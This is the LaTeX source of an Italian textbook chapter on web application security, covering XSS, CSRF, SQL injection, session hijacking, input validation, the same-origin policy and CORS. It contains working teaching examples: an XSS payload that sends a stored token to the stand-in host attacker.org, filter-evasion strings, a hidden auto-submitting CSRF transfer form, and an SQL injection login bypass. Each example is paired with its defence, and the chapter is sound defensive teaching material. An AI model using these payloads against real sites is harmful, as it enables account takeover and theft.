\chapter{Sicurezza delle applicazioni web}

Le applicazioni web hanno un ruolo cruciale nel business e nella comunicazione
moderni: proteggerle è essenziale per prevenire accessi non autorizzati,
violazioni di dati e altre attività malevole.

\dfn{Sicurezza delle applicazioni web}{
  L'insieme delle misure e delle pratiche adottate per proteggere le
  applicazioni web dalle minacce. L'obiettivo è garantire
  \term{riservatezza}, \term{integrità} e \term{disponibilità} sia
  dell'applicazione sia dei dati che tratta.}

\section{Due livelli di sicurezza}

\begin{center}
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{@{}>{\raggedright\arraybackslash}p{6.3cm}@{\hspace{1.0cm}}>{\raggedright\arraybackslash}p{6.3cm}@{}}
  \textbf{Livello di rete} & \textbf{Livello applicativo} \\
  Riguarda la comunicazione fra l'applicazione e Internet.
  & Riguarda le misure implementate \textbf{dentro} l'applicazione. \\
  Cifratura dei dati (HTTPS), firewall che filtrano richieste malevole,
  monitoraggio e log per individuare schemi sospetti.
  & Autenticazione e autorizzazione, validazione degli input, gestione delle
    sessioni, riservatezza dei dati. \\
  Protegge da attacchi al livello di rete (\textit{sniffing}, \textit{man in
  the middle}).
  & Gli attacchi possono essere \textbf{nascosti dentro richieste HTTP
    perfettamente valide} e sfruttare vulnerabilità nel modo in cui
    l'applicazione è scritta. \\
\end{tabular}
\end{center}

La sicurezza a livello di rete è argomento dei corsi di reti; qui ci occupiamo
di \textbf{sicurezza a livello applicativo}, cioè di come progettare e
sviluppare applicazioni che non contengano vulnerabilità. Esamineremo anche i
meccanismi di sicurezza dei browser moderni, per sapere come lavorarci
insieme.

\info{Quanto è grave la situazione}{
  Piuttosto grave: una quota significativa delle applicazioni web è affetta da
  almeno una vulnerabilità. L'\term{OWASP} (\textit{Open Worldwide Application
  Security Project}) è un'organizzazione senza scopo di lucro che raccoglie dati
  sulle vulnerabilità e pubblica periodicamente la classifica delle classi più
  diffuse, la \textbf{OWASP Top 10}.}

In questo capitolo vediamo un sottoinsieme di vulnerabilità che ricorrono di
frequente, possono causare danni molto seri e possono essere prevenute con
relativa facilità: \term{Cross-site Scripting}, \term{Cross-site Request
Forgery}, \term{SQL injection}, \term{session hijacking} e validazione
insufficiente degli input.

\section{Cross-site Scripting}

\dfn{Cross-site Scripting (XSS)}{
  Gli attacchi \term{XSS} mirano a \textbf{iniettare codice lato client
  malevolo} in siti altrimenti affidabili. L'attaccante sfrutta difetti
  dell'applicazione per far arrivare il proprio codice ad altri utenti.}

I difetti che rendono possibili questi attacchi si verificano quando
un'applicazione \textbf{mostra input non affidabile} (per esempio proveniente
dagli utenti) \textbf{senza validazione né escaping}.

\subsection{Conseguenze}

Il codice iniettato viene eseguito dal browser \textbf{come se fosse codice
fidato}: è indistinguibile dal JavaScript legittimo della pagina. Gli utenti
possono essere attaccati semplicemente facendo clic su un collegamento
malevolo.

Può fare tutto quello che può fare il JavaScript fidato:

\begin{itemize}
  \item accedere ai cookie e manipolarli, compresi gli identificatori di
        sessione;
  \item accedere a \code{localStorage} e \code{sessionStorage}, quindi a token
        e dati riservati;
  \item manipolare la pagina: alterare collegamenti, form, aggiungere contenuti;
  \item compiere azioni: generare clic, inviare form al posto dell'utente.
\end{itemize}

\begin{esempio}{Esfiltrare un token}
Accedere al token o al cookie di sessione è solo metà del lavoro: l'attaccante
deve anche farlo uscire dal browser della vittima. Ci sono vari modi:
reindirizzare la finestra (o un \code{iframe}) a una URL malevola, aggiungere
un'immagine la cui sorgente è una URL malevola, caricare un foglio di stile con
\attr{href} malevolo.

\begin{affianco}[0.52][c]
\codicepiccolo
\begin{lstlisting}[style=html, name=payload]
<iframe src="javascript:window.location.href =
  `https://attacker.org?token=${localStorage.getItem('token')}`">
</iframe>
\end{lstlisting}
\risultato
\begin{immagine}[Il token esce dal browser come parametro\\
                 di una normale richiesta.]
\begin{tikzpicture}[
    a/.style={-{Stealth[length=4pt,width=3.5pt]}, line width=0.75pt,
      draw=neutral!45!black}]
  \node[wtnodeplain, font=\Lato\scriptsize, text width=2.2cm] (v) at (0,0)
    {browser della vittima\\[2pt]\FiraCodeNL token: eyJh\ldots};
  \node[wtnodeplain, font=\FiraCodeNL\scriptsize, draw=merr, fill=red-gradient-1!30!white]
    (m) at (5.7,0) {attacker.org};
  \draw[a, draw=merr] (v) -- node[mcod, above]{GET /?token=eyJh\ldots} (m);
\end{tikzpicture}
\end{immagine}
\end{affianco}
\end{esempio}

\subsection{Perché filtrare non basta}

Un primo istinto è applicare \textbf{filtri} sui dati in ingresso: rimuovere le
occorrenze di \code{<script>} e \code{</script>}, o rimuovere qualunque
\code{<} e \code{>}. Sembra ragionevole?

Purtroppo i \textit{payload} XSS possono essere molto più subdoli, ed esistono
tecniche dedicate di \textbf{evasione dei filtri}. Esistono molti altri modi di
iniettare codice JavaScript:

\begin{lstlisting}[style=html, name=evasione.html]
<iframe src="javascript:alert('XSS')">
<iframe src="jav	ascript:alert('XSS')">        <!-- carattere di tabulazione -->
<iframe src="jav&#x09;ascript:alert('XSS')">  <!-- tabulazione codificata -->
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115...">
\end{lstlisting}

OWASP pubblica un intero \textit{cheatsheet} di tecniche di evasione dei filtri.

\error{Le liste nere non funzionano}{
  Elencare ciò che è pericoloso è una battaglia persa: basta un caso non
  previsto e la difesa cade. La strada corretta è l'opposto: assumere che tutto
  sia pericoloso e \textbf{codificare} l'input in modo che non possa mai essere
  interpretato come codice.}

\subsection{La soluzione: escaping}

Il modo corretto di affrontare il problema è \textbf{fare l'escaping}
(sanitizzare) degli input quando li si inserisce nelle pagine, convertendo i
caratteri pericolosi (\code{<}, \code{>}, \code{"}, \code{'}) in innocue entità
HTML --- esattamente quelle studiate nel capitolo 2.

\begin{affianco}[0.5][c]
\begin{center}\footnotesize
  \code{<script>alert("XSS")</script>} \\[3pt]
  $\downarrow$ \\[3pt]
  \code{\&lt;script\&gt;alert(\&quot;XSS\&quot;)\&lt;/script\&gt;}
\end{center}
\risultato
\renewcommand{\wtdialogohost}{shop.example.com}
\begin{browser}[senza escaping]
  Risultati per: \par\vspace{4pt}
  \wtdialogo{XSS}{\wtbottone[blue!70!black][white][blue!70!black]{OK}}
\end{browser}
\begin{browser}[con escaping]
  Risultati per: {\ttfamily <script>alert("XSS")</script>}
\end{browser}
\wtnota{Codificato, il testo viene mostrato e non eseguito.}
\end{affianco}

Soluzioni dedicate esistono nella maggior parte dei framework e dei linguaggi, e
si possono usare librerie apposite (per esempio \code{sanitize} per Node.js).

\subsection{Il modello di sicurezza di Angular}

Angular \textbf{sanitizza automaticamente} tutti i dati non fidati legati o
interpolati in un template. Per impostazione predefinita, \textbf{tutti} i dati
sono considerati non fidati.

Si possono marcare esplicitamente alcuni dati come fidati usando il
\code{DomSanitizer}, che offre metodi come
\codel{bypassSecurityTrustHtml(value: string): SafeHtml}. Questi metodi
aggirano i meccanismi di sicurezza predefiniti in contesti specifici, e vanno
ovviamente usati con estrema cautela.

\begin{lstlisting}[style=ts, name=correzione.ts]
filterTable() {
  let queryParam: string = this.route.snapshot.queryParams.q;
  if (queryParam) {
    queryParam = queryParam.trim();
    this.dataSource.filter = queryParam.toLowerCase();
-   this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)
+   this.searchValue = queryParam
  }
}
\end{lstlisting}

La vulnerabilità stava proprio nella chiamata a \code{bypassSecurityTrustHtml}
su un dato che veniva dalla query string: rimuoverla ripristina la sanitizzazione
automatica.

\section{Cross-site Request Forgery}

\dfn{CSRF}{
  Gli attacchi \term{Cross-site Request Forgery} (CSRF o XSRF) mirano a
  \textbf{costringere un utente finale a compiere azioni indesiderate} su
  un'applicazione web sulla quale è \textbf{attualmente autenticato}.}

Le azioni indesiderate possono essere operazioni che cambiano lo stato:
trasferire fondi, cambiare l'indirizzo e-mail associato a un account. Se la
vittima ha privilegi amministrativi, l'attacco può compromettere l'intera
applicazione.

\begin{figure}[H]
  \centering
  \begin{tikzpicture}[font=\Lato\small,
      hdr/.style={wtnode, minimum width=2.9cm, minimum height=0.9cm},
      life/.style={draw=neutral!45!white, line width=0.7pt, dashed},
      msg/.style={-{Stealth[length=6pt,width=5pt]}, line width=0.9pt,
                  draw=primary!70!black},
      bad/.style={-{Stealth[length=6pt,width=5pt]}, line width=0.9pt,
                  draw=red-gradient-6},
      ml/.style={font=\FiraCodeNL\scriptsize, midway, above, inner sep=2.5pt,
                 fill=white, text=neutral!15!black}]

    \def\xv{0} \def\xm{5.0} \def\xb{10.2}

    \node[hdr] (V) at (\xv,0) {\textbf{Vittima}};
    \node[hdr, draw=red-gradient-6, fill=red-gradient-1!30!white]
      (M) at (\xm,0) {\textbf{Sito malevolo}};
    \node[hdr] (B) at (\xb,0) {\textbf{Banca}};

    \draw[life] (V.south) -- (\xv,-4.2);
    \draw[life] (M.south) -- (\xm,-4.2);
    \draw[life] (B.south) -- (\xb,-4.2);

    \draw[msg] (\xv,-0.9) -- (\xb,-0.9) node[ml]{POST /login usr\&pwd};
    \draw[msg] (\xb,-1.6) -- (\xv,-1.6) node[ml]{200 OK Set-Cookie: auth=xYs...};
    \draw[bad] (\xv,-2.4) -- (\xm,-2.4) node[ml]{clic su un link malevolo};
    \draw[bad] (\xm,-3.1) -- (\xv,-3.1) node[ml]{pagina con form nascosto};
    \draw[bad] (\xv,-3.9) -- (\xb,-3.9)
      node[ml]{POST /transfer + Cookie: auth=xYs...};
  \end{tikzpicture}
  \caption{La dinamica di un attacco CSRF.}
  \label{fig:csrf}
\end{figure}

Il punto cruciale è l'ultimo passo: il browser della vittima vede che la
richiesta è diretta all'applicazione legittima e \textbf{allega
automaticamente il cookie di autenticazione}, come farebbe per qualunque altra
richiesta verso quel dominio.

\begin{esempio}{Una pagina di attacco}
\begin{affianco}[0.52][c]
\codicepiccolo
\begin{lstlisting}[style=html, name=pagina-malevola.html]
<!DOCTYPE html>
<html lang="it">
  <head>
    <title>Pagina assolutamente non malevola!</title>
  </head>
  <body>
    <h1>Ops, questo sito e' momentaneamente non disponibile.</h1>

    <form style="display:none;" method="POST"
          action="https://bank.com/transfer">
      <input type="text"   name="to"     value="EvilZampurian">
      <input type="number" name="amount" value="999.99">
      <input type="submit" id="submit"   value="submit">
    </form>

    <script>
      document.getElementById("submit").click();
    </script>
  </body>
</html>
\end{lstlisting}
\risultato
\begin{browser}[Pagina assolutamente non malevola!]
  {\raggedright\Lora\bfseries\Large Ops, questo sito e' momentaneamente
   non disponibile.\par}
\end{browser}
\begin{immagine}[Ciò che l'utente non vede: lo script invia il form.]
\begin{tikzpicture}[
    rq/.style={draw=neutral!50!black, fill=white, line width=0.7pt,
      rounded corners=2pt, inner sep=4pt, align=left, font=\FiraCodeNL\scriptsize}]
  \node[rq, draw=merr] (r) {POST https://bank.com/transfer\\
    Cookie: auth=xYs\ldots\\[2pt]
    to=EvilZampurian\&amount=999.99};
\end{tikzpicture}
\end{immagine}
\end{affianco}

Il form è invisibile (\code{display:none}) e viene inviato automaticamente da
uno script: l'utente vede solo un messaggio di errore innocuo.
\end{esempio}

\subsection{Mitigazione: il token sincronizzatore}

Il modo migliore di mitigare le vulnerabilità CSRF è un approccio basato su
token, detto \term{synchronizer token pattern}:

\begin{enumerate}
  \item l'applicazione genera un \textbf{token CSRF} specifico per la sessione e
        lo salva nella sessione;
  \item il token viene incluso in un \textbf{campo nascosto} nei form sensibili;
  \item all'invio, il token viene ritrasmesso all'applicazione;
  \item l'applicazione verifica che il token ricevuto sia lo \textbf{stesso}
        che aveva generato e salvato nella sessione corrente.
\end{enumerate}

Un attaccante non può indovinare il token --- \textbf{a patto} che non esistano
vulnerabilità XSS (che permetterebbero di leggerlo) e che i token non siano
prevedibili.

\begin{affianco}[0.48][c]
\begin{lstlisting}[style=html, name=transfer.html]
<form method="POST" action="/transfer">
  <input type="text"   name="to"     value="">
  <input type="number" name="amount" value="">
  <input type="hidden" name="csrf"   value="x5e1EUR">
  <input type="submit" value="submit">
</form>
\end{lstlisting}
\risultato
\begin{browser}[bank.com/transfer]
  \wtcampo[2.6cm]{EvilFriend}\enspace\wtcampo[1.6cm]{100}\enspace\wtbottone{submit}
\end{browser}
\begin{immagine}[Il campo nascosto non si vede, ma viene inviato.]
\begin{tikzpicture}[
    a/.style={-{Stealth[length=4pt,width=3.5pt]}, line width=0.75pt,
      draw=neutral!45!black},
    rq/.style={draw=neutral!50!black, fill=white, line width=0.7pt,
      rounded corners=2pt, inner sep=4pt, align=left, font=\FiraCodeNL\scriptsize}]
  \node[wtnodeplain, font=\FiraCodeNL\scriptsize] (s) at (2.5,0)
    {sessione: csrf = x5e1EUR};
  \node[rq] (f) at (0,-1.6) {dal form\\csrf=x5e1EUR};
  \node[rq, draw=merr] (m) at (5,-1.6) {dal sito malevolo\\(nessun csrf)};
  \draw[a] (f.north) -- node[mnota, left=4pt]{uguali \mok} ([xshift=-0.6cm]s.south);
  \draw[a, draw=merr] (m.north) -- node[mnota, above right=1pt]{diversi \merr} ([xshift=0.6cm]s.south);
\end{tikzpicture}
\end{immagine}
\end{affianco}

\info{Usare quello che il framework offre}{
  La maggior parte dei framework include già contromisure CSRF: per Express
  esistono middleware come \code{tiny-csrf}, Angular include contromisure
  proprie, Spring protegge i metodi \code{POST} per impostazione predefinita con
  un meccanismo a token. Se sono disponibili, va letta la documentazione e vanno
  usate correttamente; se non lo sono, la protezione va comunque implementata per
  le operazioni sensibili.}

\section{SQL injection}

\dfn{SQL injection}{
  Le \term{SQL injection} consistono nell'iniettare codice malevolo, proveniente
  da input utente non sanitizzati, dentro le interrogazioni al database.}

Il nome non deve trarre in inganno: anche le interrogazioni ai database NoSQL
possono essere altrettanto vulnerabili.

Questi attacchi possono portare alla fuga di dati riservati, alla modifica dei
dati, alla violazione dei controlli di accesso e, in alcuni casi, persino
all'esecuzione di codice arbitrario sul server del database.

\begin{esempio}{Una login vulnerabile}
\begin{lstlisting}[style=ts, name=login-vulnerabile.ts]
models.sequelize.query(`
  SELECT * FROM Users
  WHERE email = '${req.body.email || ''}'
    AND password = '${security.hash(req.body.password || '')}'
    AND deletedAt IS NULL`, { model: UserModel, plain: true })
  .then((authenticatedUser: { data: User }) => {
    /* utente trovato, gestisci l'autenticazione */
  }).catch(err => {
    next(err);
  });
\end{lstlisting}

I parametri della richiesta sono inseriti \textbf{direttamente} nella query.
Normalmente funziona:

\begin{lstlisting}[style=sql]
SELECT * FROM Users
WHERE email = 'luigi@webtech-sh.op'
  AND password = 'webtechs!'
  AND deletedAt IS NULL
\end{lstlisting}

Ma non possiamo fidarci dell'input dell'utente. Che cosa succede se
l'attaccante inserisce come e-mail la stringa
\code{luigi@webtech-sh.op'-{}-}?

\begin{affianco}[0.46][c]
\begin{lstlisting}[style=sql]
SELECT * FROM Users
WHERE email = 'luigi@webtech-sh.op'-- AND
  password = 'dontknowthislol' AND
  deletedAt IS NULL
\end{lstlisting}
\risultato
\begin{immagine}[Il controllo sulla password è diventato un commento:\\
                 la riga di \code{luigi} viene restituita.]
\begin{tikzpicture}
  \dbtabella{u}{(0,0)}{Users}{3}{id & email & password \\ \hline
    1 & admin@webtech-sh.op & 0192023a\ldots \\
    2 & \textcolor{merr}{luigi@webtech-sh.op} & 8f4e1cd7\ldots}
  \draw[mrif, draw=merr, <-] ([xshift=3pt,yshift=0.42cm]u.south east) -- ++(0.6,0)
    node[mnota, right, text=merr]{trovata};
\end{tikzpicture}
\end{immagine}
\end{affianco}

In SQL \code{-{}-} inizia un commento su riga singola: tutto il controllo sulla
password sparisce, e l'attaccante entra come \code{luigi} senza conoscerne la
password.
\end{esempio}

\subsection{Prevenzione}

La difesa è usare \textbf{prepared statement con query parametriche} (o
\textit{stored procedure}): i parametri vengono trasmessi al database
\textbf{separatamente} dal testo della query, quindi non possono in alcun modo
alterarne la struttura.

\begin{affianco}[0.5][c]
\codicepiccolo
\begin{lstlisting}[style=ts, name=login-sicura.ts]
models.sequelize.query(`
  SELECT * FROM Users
  WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,
  {
    bind: [req.body.email, security.hash(req.body.password)],
    model: models.User,
    plain: true
  })
  .then((authenticatedUser: { data: User }) => {
    /* utente trovato, gestisci l'autenticazione */
  }).catch(err => {
    next(err);
  });
\end{lstlisting}
\risultato
\begin{immagine}[Il testo della query e i dati viaggiano separati:\\
                 la stringa malevola resta un valore da confrontare.]
\begin{tikzpicture}[
    a/.style={-{Stealth[length=4pt,width=3.5pt]}, line width=0.75pt,
      draw=neutral!45!black},
    rq/.style={draw=neutral!50!black, fill=white, line width=0.7pt,
      rounded corners=2pt, inner sep=4pt, align=left, font=\FiraCodeNL\scriptsize}]
  \node[rq] (q) at (0,0.75) {WHERE email = \$1 AND password = \$2};
  \node[mnota, anchor=south west] at (q.north west) {\textbf{query}};
  \node[rq, text=accent!75!black] (p) at (0,-0.75) {\$1 = "luigi@webtech-sh.op'-{}-"};
  \node[mnota, anchor=north west] at (p.south west) {\textbf{parametri}};
  \node[draw=primary!65!black, fill=primary!8!white, shape=cylinder, shape border rotate=90,
        aspect=0.25, minimum width=1.2cm, minimum height=1.2cm, font=\Lato\scriptsize]
    (db) at (4.6,0) {DB};
  \draw[a] (q.east) -- (db); \draw[a] (p.east) -- (db);
\end{tikzpicture}
\end{immagine}
\end{affianco}

\info{Un altro motivo per usare un ORM}{
  Usando i metodi di un ORM come Sequelize (\code{findOne}, \code{findAll} con
  la clausola \code{where}) la parametrizzazione avviene automaticamente. Le
  \textit{query} scritte a mano concatenando stringhe sono l'eccezione, e sono
  proprio lì che si annidano queste vulnerabilità.}

\section{Session hijacking}

Sono attacchi che mirano a \textbf{compromettere il token di sessione},
tipicamente rubandone uno valido oppure indovinandolo. Tre scenari tipici:

\begin{center}
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{@{}>{\raggedright\arraybackslash}p{4.1cm}@{\hspace{0.7cm}}>{\raggedright\arraybackslash}p{8.4cm}@{}}
  \textbf{Scenario} & \textbf{Difesa} \\
  Canale di comunicazione vulnerabile: l'attaccante intercetta il traffico e
  legge il token.
  & Usare \textbf{HTTPS}: senza cifratura il token viaggia in chiaro. \\
  Applicazione vulnerabile a XSS: l'attaccante legge il token da JavaScript.
  & Eliminare le vulnerabilità XSS; marcare i cookie di sessione come
    \code{HttpOnly}, così che JavaScript non possa leggerli. \\
  Token di sessione \textbf{prevedibile}: l'attaccante lo indovina.
  & Generare identificatori lunghi e crittograficamente casuali. \\
\end{tabular}
\end{center}

\section{Validazione degli input}

Una validazione corretta degli input è gran parte del lavoro per garantire
l'integrità dei dati in un'applicazione web.

La validazione \textbf{lato client} è un'ottima pratica di usabilità: gli errori
vengono presentati all'utente il prima possibile. Può però essere
\textbf{completamente aggirata} da un attaccante, che ha accesso al codice lato
client e può manipolarlo, o che può generare richieste HTTP direttamente.

\error{La validazione deve sempre esserci anche sul server}{
  Tutto ciò che gira nel browser è sotto il controllo dell'utente. I controlli
  lato client servono all'utente onesto, non contro l'attaccante.}

\begin{esempio}{Aggirare la validazione con i DevTools}
Nell'applicazione dimostrativa OWASP Juice Shop i clienti possono lasciare una
valutazione al negozio, e l'interfaccia garantisce che si possa scegliere solo
un punteggio da 1 a 5. Si riesce a inserire uno 0?

Ispezionando le richieste di rete nei DevTools si vede che l'invio produce una
\code{POST} a \code{/api/Feedbacks/} con questo corpo:

\begin{affianco}[0.46][c]
\begin{lstlisting}[style=json, name=corpo della richiesta]
{
  "UserId": 2,
  "captchaId": 1,
  "captcha": "80",
  "comment": "Example review (***@webtech-sh.op)",
  "rating": 3
}
\end{lstlisting}
\risultato
\begin{immagine}[Reinviata con \textit{Resend}: il server l'accetta.]
\begin{tikzpicture}[
    a/.style={-{Stealth[length=4pt,width=3.5pt]}, line width=0.75pt,
      draw=neutral!45!black},
    rq/.style={draw=neutral!50!black, fill=white, line width=0.7pt,
      rounded corners=2pt, inner sep=4pt, align=left, font=\FiraCodeNL\scriptsize}]
  \node[rq] (o) at (0,0) {POST /api/Feedbacks/\\\ldots\\"rating": 3};
  \node[rq, draw=accent!60!black] (m) at (5.0,0)
    {POST /api/Feedbacks/\\\ldots\\\textcolor{merr}{"rating": 0}};
  \draw[a] (o) -- node[mnota, above]{modifica} (m);
  \node[anchor=north] at ([yshift=-6pt]m.south) {\dtstato{201}\,{\Lato\scriptsize Created}};
\end{tikzpicture}
\end{immagine}
\end{affianco}

Basta rispedire la richiesta modificata con \code{"rating": 0}, cosa che si può
fare direttamente dai DevTools con il comando \textit{Resend}. L'interfaccia
non è mai stata un ostacolo.
\end{esempio}

\section{I meccanismi di sicurezza del browser}

I browser moderni impongono un modello di sicurezza rigoroso per bloccare
alcune classi di attacchi. Chi sviluppa per il Web deve conoscere questi
meccanismi e sapere come lavorarci insieme. Il principale è la \term{Same-origin
Policy}.

\subsection{Same-origin Policy}

\dfn{Same-origin Policy}{
  Per impostazione predefinita, un documento o uno script può interagire
  soltanto con risorse della \textbf{stessa origine}. Stessa origine significa
  che la URL ha lo stesso \textbf{protocollo}, la stessa \textbf{porta} e lo
  stesso \textbf{host}.}

Consideriamo il documento all'indirizzo
\code{http://store.webtech.com/cat/index.html}:

\begin{center}
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{@{}l@{\hspace{0.8cm}}c@{\hspace{0.8cm}}l@{}}
  \textbf{URL} & \textbf{Stessa origine?} & \textbf{Motivo} \\
  \code{http://store.webtech.com/pages/about.html} & sì  & differisce solo il percorso \\
  \code{http://store.webtech.com/img/logo.png}     & sì  & differisce solo il percorso \\
  \code{https://store.webtech.com/page.html}       & no  & protocollo diverso \\
  \code{http://store.webtech.com:81/dir/page.html} & no  & porta diversa \\
  \code{http://course.webtech.com/cat/index.html}  & no  & host diverso \\
\end{tabular}
\end{center}

La politica si applica in generale a tutti i dati recuperati da codice
JavaScript tramite \code{fetch()} o \code{XMLHttpRequest}.

\begin{affianco}[0.46][c]
\begin{lstlisting}[style=js, name=pagina su localhost:3001]
function doFetch() {
  fetch("http://localhost:3000/").then(data => {
    data.json().then(data => {
      console.log(data)
    })
  }).catch(err => {
    console.log(err.message)  // richiesta bloccata
  });
}
\end{lstlisting}
\risultato
\begin{console}[Console]
Richiesta multiorigine (cross-origin) bloccata: il criterio di corrispondenza dell'origine non consente la lettura della risorsa remota da http://localhost:3000/. Motivo: header CORS "Access-Control-Allow-Origin" mancante.
NetworkError when attempting to fetch resource.
\end{console}
\end{affianco}

\subsection{CORS}

A volte abbiamo bisogno di accedere a contenuti di origini diverse --- e in
effetti lo abbiamo già fatto, nel capitolo sulle API REST.

\dfn{CORS}{
  Il meccanismo \term{Cross-origin Resource Sharing} permette a un server di
  \guillemotleft rinunciare\guillemotright\ alla Same-origin Policy e dichiarare che i propri
  contenuti possono essere letti anche da origini diverse dalla propria.}

CORS è basato sugli \textbf{header}:

\begin{itemize}
  \item il browser allega un header \code{Origin} alle richieste in uscita;
  \item il server può includere nella risposta un header
        \code{Access-Control-Allow-Origin}, il cui valore specifica quali
        origini sono autorizzate a usare i dati:
        \code{*} significa qualunque origine, oppure si indica un'origine
        specifica come \code{http://localhost:3001};
  \item se l'header non è presente, il valore predefinito è che le richieste
        cross-origin sono \textbf{vietate};
  \item il browser verifica che \code{Access-Control-Allow-Origin} corrisponda a
        \code{Origin}: se sì il codice client può accedere ai dati, altrimenti
        la richiesta viene bloccata.
\end{itemize}

\begin{figure}[H]
  \centering
  \begin{tikzpicture}[font=\Lato\scriptsize,
      hdr/.style={wtnode, minimum width=2.6cm, minimum height=0.8cm},
      msg/.style={-{Stealth[length=5pt,width=4pt]}, line width=0.85pt,
                  draw=primary!70!black},
      ml/.style={font=\FiraCodeNL\scriptsize, midway, above, inner sep=2pt,
                 fill=white, text=neutral!15!black}]

    % bloccato
    \node[font=\Lato\scriptsize\bfseries, text=red-gradient-6!75!black]
      at (4.4,1.5) {scenario bloccato};
    \node[hdr] (c1) at (0,0.75) {localhost:3001};
    \node[hdr] (s1) at (8.8,0.75) {localhost:3000};
    \draw[msg] (c1) -- (s1) node[ml]{GET /data \ Origin: http://localhost:3001};
    \draw[msg, draw=red-gradient-6] (8.8,0.15) -- (0,0.15)
      node[ml, below]{200 OK \ (nessun header CORS)};
    \node[font=\Lato\normalsize\bfseries, text=red-gradient-6] at (4.4,-0.3) {X};

    % permesso
    \node[font=\Lato\scriptsize\bfseries, text=green-gradient-6!60!black]
      at (4.4,-1.3) {scenario permesso};
    \node[hdr] (c2) at (0,-2.05) {localhost:3001};
    \node[hdr] (s2) at (8.8,-2.05) {localhost:3000};
    \draw[msg] (c2) -- (s2) node[ml]{GET /data \ Origin: http://localhost:3001};
    \draw[msg, draw=green-gradient-6] (8.8,-2.65) -- (0,-2.65)
      node[ml, below]{200 OK \ Access-Control-Allow-Origin: *};
  \end{tikzpicture}
  \caption{Il meccanismo CORS.}
  \label{fig:cors}
\end{figure}

\warning{CORS non protegge il server}{
  È un fraintendimento comune. CORS è un meccanismo del \textbf{browser}, che
  protegge l'utente impedendo a una pagina malevola di leggere le risposte di
  un'altra origine. Non impedisce affatto a un programma qualunque (un client
  scritto a mano, \code{curl}) di contattare il server. L'autorizzazione va
  comunque imposta lato server.

  Si noti anche che \code{Access-Control-Allow-Origin: *} --- quello che
  avevamo scritto nel capitolo 15 con \code{app.use(cors())} --- rende l'API
  leggibile da qualunque sito: va bene per una API pubblica, non per una che
  espone dati riservati.}

\section{Riferimenti}

\begin{itemize}
  \item \textbf{Cross Site Scripting (XSS) Attacks} --- OWASP. \\
        \urlx{https://owasp.org/www-community/attacks/xss/}
  \item \textbf{XSS game} --- esercitazione pratica. \\
        \urlx{https://xss-game.appspot.com/}
  \item \textbf{Cross Site Request Forgery (CSRF) Attacks} --- OWASP. \\
        \urlx{https://owasp.org/www-community/attacks/csrf}
  \item \textbf{SQL Injection Attacks} --- OWASP. \\
        \urlx{https://owasp.org/www-community/attacks/SQL_Injection}
  \item \textbf{Same-origin Policy} --- MDN web docs. \\
        \urlx{https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy}
  \item \textbf{Cross-Origin Resource Sharing (CORS)} --- MDN web docs. \\
        \urlx{https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS}
  \item \textbf{Web Application Security Guide} --- Wikibooks. \\
        \urlx{https://en.wikibooks.org/wiki/Web_Application_Security_Guide}
\end{itemize}
